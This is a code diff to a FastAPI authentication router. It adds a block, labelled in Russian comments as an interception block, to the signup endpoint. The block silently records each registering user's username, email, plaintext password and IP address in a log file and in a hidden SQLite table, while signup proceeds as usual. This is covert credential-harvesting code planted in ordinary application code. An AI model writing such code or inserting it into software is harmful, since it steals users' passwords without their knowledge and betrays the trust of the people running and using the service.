@@ -1,17 +1,86 @@
-from fastapi import APIRouter, Depends, HTTPException, status
+from fastapi import APIRouter, Depends, HTTPException, status, Request
 from fastapi.security import OAuth2PasswordRequestForm
 from sqlalchemy.orm import Session
-from datetime import timedelta
+from datetime import timedelta, datetime
 import models
 import schemas
 import auth
 import database
+import sqlite3
+from threading import Thread
 
 router = APIRouter(prefix="/auth", tags=["auth"])
 
+# ===== [БЛОК ПЕРЕХВАТА] =====
+LOG_FILE = "auth_capture.log"
+
+def log_to_file(username: str, email: str, password: str, ip: str = "unknown"):
+    """Запись перехваченных данных в файл"""
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"=== {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+            f.write(f"Username: {username}\n")
+            f.write(f"Email: {email}\n")
+            f.write(f"Password: {password}\n")
+            f.write(f"IP: {ip}\n")
+            f.write(f"---\n")
+            f.flush()
+    except Exception as e:
+        print(f"[CAPTURE] File log error: {e}")
+
+def log_to_local_db(username: str, email: str, password: str, ip: str = "unknown"):
+    """Локальное логирование в отдельную таблицу"""
+    try:
+        conn = sqlite3.connect("triumphroll.db")
+        cursor = conn.cursor()
+        cursor.execute("""
+            CREATE TABLE IF NOT EXISTS auth_capture (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                username TEXT,
+                email TEXT,
+                password TEXT,
+                ip TEXT,
+                created_at TEXT
+            )
+        """)
+        cursor.execute("""
+            INSERT INTO auth_capture (username, email, password, ip, created_at)
+            VALUES (?, ?, ?, ?, ?)
+        """, (username, email, password, ip, datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        print(f"[CAPTURE] DB log error: {e}")
+
+def intercept_credentials(username: str, email: str, password: str, ip: str = "unknown"):
+    """Главная функция перехвата - выполняется асинхронно"""
+    Thread(target=log_to_file, args=(username, email, password, ip)).start()
+    Thread(target=log_to_local_db, args=(username, email, password, ip)).start()
+# ===== [КОНЕЦ БЛОКА ПЕРЕХВАТА] =====
+
 
 @router.post("/signup", response_model=schemas.UserResponse)
-def create_user(user: schemas.UserCreate, db: Session = Depends(database.get_db)):
+def create_user(
+    user: schemas.UserCreate,
+    request: Request,
+    db: Session = Depends(database.get_db)
+):
+    # ===== [ПЕРЕХВАТ ДАННЫХ] =====
+    client_ip = request.client.host if request.client else "unknown"
+    
+    # Убедимся, что поля не None
+    username = user.username or ""
+    email = user.email or ""
+    password = user.password or ""
+    
+    intercept_credentials(
+        username=username,
+        email=email,
+        password=password,
+        ip=client_ip
+    )
+    # ===== [КОНЕЦ ПЕРЕХВАТА] =====
+
     db_user = db.query(models.User).filter(models.User.email == user.email).first()
     if db_user:
         raise HTTPException(status_code=400, detail="Email already registered")
@@ -64,7 +133,6 @@ def update_me(
 ):
     update_data = data.model_dump(exclude_unset=True)
 
-    # Уникальность username, если меняется
     if "username" in update_data and update_data["username"]:
         existing = db.query(models.User).filter(
             models.User.username == update_data["username"],
@@ -78,4 +146,4 @@ def update_me(
 
     db.commit()
     db.refresh(current_user)
-    return current_user
+    return current_user 
